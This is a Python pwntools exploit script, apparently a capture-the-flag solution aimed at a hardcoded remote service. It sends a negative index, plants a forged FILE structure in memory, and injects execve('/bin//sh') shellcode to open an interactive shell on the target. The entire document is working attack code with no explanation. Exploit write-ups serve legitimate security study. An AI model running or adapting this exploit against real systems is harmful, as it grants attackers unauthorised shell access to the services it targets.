from pwn import *

local = False

if local:
	HOST, PORT = '0.0.0.0', 31337
else:
	HOST, PORT = '54.202.2.54', 8888

r = remote(HOST, PORT)

def rw(*data):
	rx, tx = data[:2]
	rx, tx = str(rx), str(tx)
	r.recvuntil(rx)
	if len(data) == 3:
		r.send(tx)
	else:
		r.sendline(tx)

name = 0x602a20
ptr1, ptr2, ptr3 = 0, 0, 0
lock = name + 16
wide_data = name + 100
obj = 'sh'.ljust(8, '\x00') + p64(ptr1) * 7 + p64(ptr2) + p64(0) * 4 + p64(ptr3) + p64(1) + p64(0xffffffffffffffff)
obj += p64(0x0000000009000000) + p64(lock) + p64(0xffffffffffffffff) + p64(0) + p64(wide_data) + p64(0) * 3 + p64(0xffffffff) + p64(0) * 2 + p64(name + 8 - 0x28)
shellcode = "\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x52\x53" "\x54\x5f\x52\x57\x54\x5e\x0f\x05"

rw(': ', p64(len(obj)) + p64(0x400b47), 0),
rw(')', 'y'),
rw(': ', '')

rw('>>', 1)
rw(':', -16)
rw('>>', 2)
rw(':', obj)
rw('>>', 5)
rw(':', '')
rw(':', '')
rw('here', shellcode)
r.interactive()